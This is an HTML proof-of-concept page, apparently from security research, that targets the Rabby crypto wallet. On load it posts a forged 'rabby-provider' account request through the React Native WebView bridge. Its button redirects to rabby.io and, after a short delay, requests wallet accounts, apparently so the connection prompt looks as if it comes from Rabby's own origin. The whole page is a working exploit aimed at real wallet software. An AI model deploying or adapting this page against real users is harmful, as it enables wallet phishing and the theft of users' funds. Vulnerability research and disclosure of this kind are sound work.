<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Spoof Relay - poc2: 200</title>
  <script>
    window.addEventListener("message", function(event) {console.log(event)});
    ReactNativeWebView.postMessage(
        '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
    );
  </script>
</head>
<body>
  <h2>Connecting Walletâ€¦</h2>
  <p id="msg">Please click the button to connect.</p>
  <button id="connectBtn">Connect Wallet: 400</button>
  <script>
    document.getElementById('connectBtn').addEventListener('click', async () => {
      if (!window.ethereum) {
        document.getElementById('msg').innerText = 'No wallet installed!';
        return;
      }
      try {
        window.location = 'https://rabby.io';
        setTimeout(async () => {
          const accountsPromise = window.ethereum.request({
            method: 'eth_requestAccounts'
          });
          try {
            const accounts = await accountsPromise;
            document.getElementById('msg').innerText =
              'Connected: ' + accounts[0];
          } catch (err) {
            document.getElementById('msg').innerText = 'Connection failed';
            console.error(err);
          }
        }, 400);
      } catch (err) {
        document.getElementById('msg').innerText = 'Unexpected error';
        console.error(err);
      }
    });
  </script>
</body>
</html>
